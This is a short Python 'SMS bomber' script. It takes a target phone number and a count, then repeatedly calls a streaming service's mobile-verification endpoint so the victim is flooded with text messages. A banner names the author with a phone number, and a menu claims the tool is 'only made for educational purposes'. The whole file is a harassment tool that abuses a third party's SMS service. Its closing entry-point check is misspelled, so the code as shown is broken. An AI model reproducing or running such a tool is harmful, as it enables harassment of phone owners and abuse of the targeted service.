def main():
      import sys
      import os
      import requests as rq
      from requests.structures import CaseInsensitiveDict
      from time import sleep

      def exit():
            print('\n>>> Exiting...')
            sleep(2)
            sys.exit()

      def clear():
            if os.name=='nt':
                  os.system('cls')
            else:
                  os.system('clear')

      def banner():
            b='''
                Made By Efty Forid
                Contact:01311735268
|  ___|/ _| |         |  ____|       ()   | |
 | |__  | |_| |_ _   _  | |__ _  _ __ _  __| |
 |  __| |  _| __| | | | |  __/ _ \| '__| |/ _` |
 | |____| | | |_| |_| | | | | (_) | |  | | (_| |
 |______|_|  \__|\__, | |_|  \___/|_|  |_|\__,_|
                  __/ |
                 |___/
      '''
            print(b)

      def menu():
            menu='''\n>>> its only made for educational purposes, Not for Revenge!
      Choose a option below:
      1. Start SMS Bomber
      2. Exit'''
            print(menu)

      def bomb():
            number=str(input(">>> [!] Enter Target Number: +88"))
            amount=int(input(">>> [!] Enter Amount Of SMS: "))
            url = "https://toffeelive.com/app/service.php"
            headers = CaseInsensitiveDict()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = "phoneNumber="+number+"&route=auth_verify_mobile_no"
            resp = rq.post(url, headers=headers, data=data)
            for i in range(amount):
                  resp = rq.post(url, headers=headers, data=data)
                  if resp.status_code==200:
                        print(f'>>> [+] {i+1} SMS Sent Successfully')
                  elif resp.status_code==201:
                        print(f'>>> [+] {i+1} SMS Sent Successfully')
            sleep(2)
            input('\n>>> Task Done! Press Enter to Return...')
            sleep(2)
            

      while True:
            try:
                  while True:
                        clear()
                        banner()
                        menu()
                        choice=str(input("\n>>> Enter your choice (1/2): "))
                        if choice in ('1','2'):
                              if choice=='1':
                                    clear()
                                    banner()
                                    bomb()
                              elif choice=='2':
                                    exit()
                        else:
                              print('>>> Invalid Input')
                              sleep(2)
            except KeyboardInterrupt:
                  exit()

if _name__=='__main_':
      main()